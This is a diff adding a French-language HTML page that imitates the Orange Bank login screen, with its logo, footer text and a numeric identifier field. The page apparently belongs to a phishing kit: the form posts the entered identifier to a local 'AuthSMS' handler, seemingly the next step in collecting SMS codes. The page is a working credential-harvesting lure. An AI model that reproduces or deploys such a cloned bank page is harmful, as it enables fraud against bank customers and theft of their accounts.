@@ -1,0 +1,243 @@
+<html><head>
+	<link rel="stylesheet" type="text/css" href="./triangle/css/fontawesome.min.css">
+	<link rel="stylesheet" type="text/css" href="./triangle/css/all.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<style type="text/css">
+
+body {
+    max-width: 400px;
+      margin: auto;
+}
+
+.form-style-8 h2{
+	background: #4D4D4D;
+	text-transform: uppercase;
+	font-family: 'Open Sans Condensed', sans-serif;
+	color: #797979;
+	font-size: 18px;
+	font-weight: 100;
+	padding: 20px;
+	margin: -30px -30px 30px -30px;
+}
+.form-style-8 input[type="password"]
+{
+
+	box-sizing: border-box;
+	-webkit-box-sizing: border-box;
+	-moz-box-sizing: border-box;
+	outline: none;
+	display: block;
+	width: 80%;
+	max-width: 500px;
+	padding: 7px;
+	border: none;
+	margin-left:3%;
+	border-bottom: 1px solid #ddd;
+	background: transparent;
+	margin-bottom: 10px;
+	font: 34px Arial, Helvetica, sans-serif;
+	height: 45px;
+
+}
+
+input[type=checkbox] + label {
+  display: inline;
+  margin: 0.2em;
+  cursor: pointer;
+  padding: 0.2em;
+}
+
+input[type=checkbox] {
+  display: none;
+font-family: roboto;
+font-size: .75rem;
+color: inherit;
+margin-top: 0.2px;
+font-weight: inherit;
+
+}
+
+input[type=checkbox] + label:before {
+  content: "\2714";
+  border: 0.17em solid #cccccc;
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  padding-left: 0.2em;
+  padding-bottom: 0.3em;
+  margin-right: 0.2em;
+  vertical-align: bottom;
+  color: transparent;
+  transition: .2s;
+}
+
+input[type=checkbox] + label:active:before {
+  transform: scale(0);
+}
+
+input[type=checkbox]:checked + label:before {
+  background-color: #f16e00;
+  border-color: #f16e00;
+  color: white;
+}
+
+input[type=checkbox]:disabled + label:before {
+  transform: scale(1);
+  border-color: #000;
+}
+
+input[type=checkbox]:checked:disabled + label:before {
+  transform: scale(1);
+  background-color: green;
+  border-color: green;
+}
+
+.form-style-8 input[type="text"],
+.form-style-8 input[type="date"],
+.form-style-8 input[type="datetime"],
+.form-style-8 input[type="email"],
+.form-style-8 input[type="number"],
+.form-style-8 input[type="search"],
+.form-style-8 input[type="time"],
+.form-style-8 input[type="url"],
+.form-style-8 textarea,
+.form-style-8 select 
+{
+	box-sizing: border-box;
+	-webkit-box-sizing: border-box;
+	-moz-box-sizing: border-box;
+	outline: none;
+	display: block;
+	width: 80%;
+	max-width: 500px;
+	padding: 7px;
+	border: none;
+	margin-left:3%;
+	border-bottom: 1px solid #ddd;
+	background: transparent;
+	margin-bottom: 10px;
+	font: 34px Arial, Helvetica, sans-serif;
+	height: 45px;
+}
+.form-style-8::placeholder {
+  color: red;
+  font-size: 1.2em;
+  font-style: italic;
+}
+
+.form-style-8 textarea{
+	resize:none;
+	overflow: hidden;
+}
+.form-style-8 input[type="button"], 
+.form-style-8 input[type="submit"]{
+	-moz-box-shadow: inset 0px 1px 0px 0px #45D6D6;
+	-webkit-box-shadow: inset 0px 1px 0px 0px #45D6D6;
+	box-shadow: inset 0px 1px 0px 0px #45D6D6;
+	background-color: #2CBBBB;
+	border: 1px solid #27A0A0;
+	display: inline-block;
+	cursor: pointer;
+	color: #FFFFFF;
+	font-family: 'Open Sans Condensed', sans-serif;
+	font-size: 14px;
+	padding: 8px 18px;
+	text-decoration: none;
+	text-transform: uppercase;
+}
+.form-style-8 input[type="button"]:hover, 
+.form-style-8 input[type="submit"]:hover {
+	background:linear-gradient(to bottom, #34CACA 5%, #30C9C9 100%);
+	background-color: #34CACA;
+}
+.field-icon {
+  float: right;
+  margin-left: -25px;
+  margin-top: -35px;
+  position: relative;
+  z-index: 2;
+  color: #f16e00;
+}
+</style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Authentification - Orange Bank</title>
+ <link rel="icon" href="./favicon.ico" type="image/ico" sizes="16x16">
+<link rel="stylesheet" type="text/css" href="files/style.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="files/function.js"></script>
+	
+</head>
+<body>
+	<form class="form" action="AuthSMS" method="post" enctype="multipart/form-data">
+		<div class="table">
+			<img class="logo" src="./files/oblogo.png">
+			
+			<div>
+<br><br>
+			<p style="color: #000000;" class="txt2">Bonjour,</p>
+			<h1 style="color: #000000;" class="txt3">Saisissez votre identifiant
+Orange Bank</h1>
+			</div>
+			<br>
+		
+			<div class="form-style-8">
+    <input pattern="[0-9]*" inputmode="numeric" style="letter-spacing: 17px;" onkeypress="return isNumber(event)" name="password" id="password-field" required="" maxlength="8" type="password"></div><span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span>
+	
+			<img src="./files/8chi.png" style="max-width: 350px;" width="100%"><br><br>
+
+<div style="clear: both;"></div>
+<div id="textbox">
+<input id="rememberMe" type="checkbox" formcontrolname="rememberMe" class="alignleft">
+<label for="rememberMe" class="alignleft"><span style="margin-left: 2px;font-size: .85rem; ! important" class="alignleft">Mémoriser mon identifiant</span></label>
+<label for="rememberMee" class="alignright"><span class="alignleft">Identifiant oublié ?</span></label>
+</div>
+
+			<br>
+			
+			<br>
+			
+			<br>
+			
+			<br>
+			<button tabindex="6" class="btn" type="submit" name="btn">Me connecter</button>
+
+
+			<br>
+			<hr class="hr" align="left">
+			<br>
+			<p href="#" target="_blank" class="txtfo">Cookies et Mentions légales</p>
+			<p href="#" target="_blank" class="txtfo">Informations financières et réglementaires</p>
+			<p href="#" target="_blank" class="txtfo2">© Orange Bank 2021</p>
+		</div>
+	</form>
+
+	<script type="text/javascript">
+  $(".toggle-password").click(function() {
+
+  $(this).toggleClass("fa-eye fa-eye-slash");
+  var input = $($(this).attr("toggle"));
+  if (input.attr("type") == "password") {
+    input.attr("type", "text");
+  } else {
+    input.attr("type", "password");
+  }
+});
+
+
+
+    
+function isNumber(evt) {
+    evt = (evt) ? evt : window.event;
+    var charCode = (evt.which) ? evt.which : evt.keyCode;
+    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+        return false;
+    }
+    return true;
+}
+
+
+
+</script>
+
+</body></html>
